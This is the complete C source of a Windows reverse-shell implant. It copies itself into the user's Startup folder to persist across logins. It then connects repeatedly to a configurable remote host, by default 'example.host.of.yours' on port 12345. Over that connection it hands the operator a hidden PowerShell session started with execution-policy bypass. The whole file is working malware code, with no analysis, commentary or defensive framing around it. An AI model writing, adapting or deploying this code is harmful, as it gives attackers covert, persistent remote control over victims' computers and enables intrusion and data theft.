#define WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define DEFAULT_HOST   "example.host.of.yours"
#define DEFAULT_PORT   12345
#define RETRY_DELAY_MS 2000
#define MAX_RETRIES    0

static void self_persist(void)
{
    char src[MAX_PATH]     = {0};
    char dst[MAX_PATH]     = {0};
    char appdata[MAX_PATH] = {0};
    char *fname;

    if (!GetModuleFileNameA(NULL, src, sizeof(src))) return;
    if (strstr(src, "Start Menu\\Programs\\Startup") != NULL) return;
    if (!GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata))) return;

    fname = strrchr(src, '\\');
    if (!fname) return;
    fname++;

    _snprintf(dst, sizeof(dst) - 1,
              "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s",
              appdata, fname);

    CopyFileA(src, dst, FALSE);
}

static SOCKET connect_to(const char *host, unsigned short port)
{
    struct sockaddr_in addr = {0};
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    addr.sin_family = AF_INET;
    addr.sin_port   = htons(port);
    addr.sin_addr.s_addr = inet_addr(host);

    if (addr.sin_addr.s_addr == INADDR_NONE) {
        struct hostent *he = gethostbyname(host);
        if (!he) { closesocket(sock); return INVALID_SOCKET; }
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}

static int spawn_shell(SOCKET sock)
{
    STARTUPINFOA        si = {0};
    PROCESS_INFORMATION pi = {0};
    char cmd[] = "powershell.exe -NoProfile -ExecutionPolicy Bypass";

    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;

    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return -1;

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}

int main(int argc, char *argv[])
{
    const char    *host = DEFAULT_HOST;
    unsigned short port = DEFAULT_PORT;
    unsigned int   tries = 0;
    WSADATA        wsa;
    SOCKET         sock;

    self_persist();

    if (argc >= 2) host = argv[1];
    if (argc >= 3) port = (unsigned short)atoi(argv[2]);

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    while (1) {
        tries++;
        sock = connect_to(host, port);

        if (sock != INVALID_SOCKET) {
            spawn_shell(sock);
            shutdown(sock, SD_BOTH);
            closesocket(sock);
        }

        if (MAX_RETRIES && tries >= MAX_RETRIES) break;
        Sleep(RETRY_DELAY_MS);
    }

    WSACleanup();
    return 0;
}

